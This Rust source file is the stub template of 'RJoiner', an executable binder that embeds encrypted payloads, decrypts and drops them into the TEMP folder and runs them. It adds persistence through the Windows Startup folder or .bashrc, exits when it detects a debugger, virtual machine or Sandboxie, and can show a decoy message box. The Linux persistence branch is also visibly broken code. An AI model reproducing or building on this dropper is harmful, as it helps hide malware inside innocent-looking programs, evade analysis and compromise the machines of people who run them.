/*
    RJoiner to join executables
    Copyright (C) 2023  ftdot

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#![allow(dead_code)]
#![allow(non_snake_case)]

//--win-subsys--

use std::fs;
use std::path::PathBuf;
use std::env;

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce
};
use base64::{Engine as _, engine::general_purpose};
use execute::shell;

#[cfg(feature="anti_sandboxie")]
use std::ffi::CString;

#[cfg(target_os = "linux")]
#[cfg(not(debug_assertions))]
use debugoff;

// Constants

static KEY: &'static [u8] = b"--key--";

// Functions

fn decrypt_content(nonce: &[u8], content: &[u8], key: &[u8]) -> Option<Vec<u8>> {

    let content_ = match general_purpose::STANDARD_NO_PAD.decode(content) {
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while base64 decoding: {}", e); return None; }
        Ok(r) => { r }
    };

    let nonce_vec = match general_purpose::STANDARD_NO_PAD.decode(nonce) {
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while getting nonce: {}", e); return None; }
        Ok(r) => { r }
    };

    let nonce_ = nonce_vec.as_slice();

    let cipher = match Aes256Gcm::new_from_slice(key) {
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while initializing cipher: {}", e); return None; }
        Ok(r) => { r }
    };

    match cipher.decrypt(Nonce::from_slice(nonce_), content_.as_ref()) {
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while decrypting data: {}", e); None }
        Ok(r) => { Some(r) }
    }
}

fn decrypt_n_drop(temp: &str, filename: &str, nonce: &[u8], content: &[u8], key: &[u8], autorun: bool) -> bool {

    let path = PathBuf::from(temp).join(filename);

    #[cfg(debug_assertions)] println!("Decrypt and drop file {} by path {}", filename, path.display());

    let content_dec = match decrypt_content(nonce, content, key) {
        Some(r) => { r }
        None => { #[cfg(debug_assertions)] println!("Cannot decrypt content"); return false; }
    };

    let content_unzip = match unzip(content_dec.as_slice()) {
        Some(r) => { r }
        None => { #[cfg(debug_assertions)] println!("Cannot decompress data"); return false; }
    };

    match fs::write(&path, &content_unzip) {
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while file write out: {}", e); return false; }
        Ok(_) => {}
    };

    let extension = match path.extension() {
        Some(s) => {
            match s.to_str() {
                Some(r) => { r }
                None => { #[cfg(debug_assertions)] println!("Error while converting OsStr to str"); return false; }
            }
        }
        None => { #[cfg(debug_assertions)] println!("Error while getting extension"); return false; }
    };

    match autorun {
        true => {
            #[cfg(target_os="windows")]
            {
                match env::var("APPDATA") {
                    Ok(r) => {
                        let startup_path = r + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + filename;
                        #[cfg(debug_assertions)] println!("Writing autorun by path \"{}\"", &startup_path);
                        match fs::write(startup_path, content_unzip) {
                            #[allow(unused_variables)]
                            Err(e) => { #[cfg(debug_assertions)] println!("Error writing file to autorun (Windows): {}", e); }
                            Ok(_) => {}
                        };
                    }
                    Err(_) => {}
                };
            }

            #[cfg(target_os="linux")]
            {
                match env::var("HOME") {
                    Ok(r) => {
                        let p = r + "/.bashrc";
                        match fs::read(&p) {
                            #[allow(unused_variables)]
                            Err(e) => { #[cfg(debug_assertions)] println!("Error reading file .bashrc (Windows)") }
                            Ok(r) => {
                                r.extend_from_slice(b"\n");
                                match fs::write("C:\\Users\\".to_owned() + env!("USERNAME"), r + content_unzip) {
                                    #[allow(unused_variables)]
                                    Err(e) => { #[cfg(debug_assertions)] println!("Error writing file to autorun (Windows)") }
                                    Ok(_) => {}
                                };
                            }
                        };
                    }
                    Err(_) => {}
                };
            }
        }
        false => {}
    };

    let path_str = match path.to_str() {
        Some(r) => { r }
        None => { #[cfg(debug_assertions)] println!("Error while converting PathBuf to str"); return false; }
    };

    let command =
        if cfg!(target_os="windows") {
            "cmd /c start ".to_owned() + path_str
        } else if cfg!(target_os="linux") {

            if filename.ends_with("_bash.sh") {
                "bash \"".to_owned() + "\""
            } else {

                match extension {
                    "sh" => { "sh \"".to_owned() + "\"" }
                    "py" => { "python3 \"".to_owned() + "\"" }
                    _ => { path_str.to_owned() }
                }

            }
        } else {
            path_str.to_owned()
        };

    match shell(command).spawn() {
        Ok(_) => {}
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while running process {}", e); return false; }
    };

    #[cfg(debug_assertions)] println!("file {} run!", filename);

    true
}

fn unzip(data: &[u8]) -> Option<Vec<u8>> {
    match yazi::decompress(&data, yazi::Format::Zlib) {
        Ok(r) => { Some(r.0) }
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while data decompressing: {:?}", e); None }
    }
}

#[cfg(any(feature="show_messagebox_after", feature="show_messagebox_before"))]
#[allow(unused_must_use)]
fn show_message() {
    msgbox::create("--messagebox-title--", "--messagebox-text--", msgbox::IconType::SHOW_MESSAGEBOX_TYPE);
}

fn main() {

    #[cfg(target_os = "linux")]
    #[cfg(not(debug_assertions))]
    debugoff::multi_ptraceme_or_die();

    #[cfg(feature="show_messagebox_before")]
    show_message();

    #[cfg(feature="anti_vm")]
    if inside_vm::inside_vm() { #[cfg(debug_assertions)] println!("VM was detected. Exiting..."); return; }

    #[cfg(feature="anti_sandboxie")]
    unsafe {
        let c_str = match CString::new("SbieDll.dll") {
            Ok(r) => { r }
            #[allow(unused_variables)]
            Err(e) => { #[cfg(debug_assertions)] println!("Error while converting str to CString: {:?}", e); return; }
        };
        if !winapi::um::libloaderapi::GetModuleHandleA(c_str.as_ptr() as *const i8).is_null() { #[cfg(debug_assertions)] println!("Sandboxie detected. Exiting..."); return; };
    }

    #[allow(unused_variables)]
    let temp = match env::var("TEMP") {
        Ok(r) => { r }
        Err(_) => { return; }
    };
    
    let key_vec = match general_purpose::STANDARD_NO_PAD.decode(KEY) {
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while base64 decoding key: {}", e); return; }
        Ok(r) => { r }
    };
    #[allow(unused_variables)]
    let key = key_vec.as_slice();

    //--gen-code--

    #[cfg(feature="show_messagebox_after")]
    show_message();


    #[cfg(target_os = "linux")]
    #[cfg(not(debug_assertions))]
    debugoff::multi_ptraceme_or_die();
}
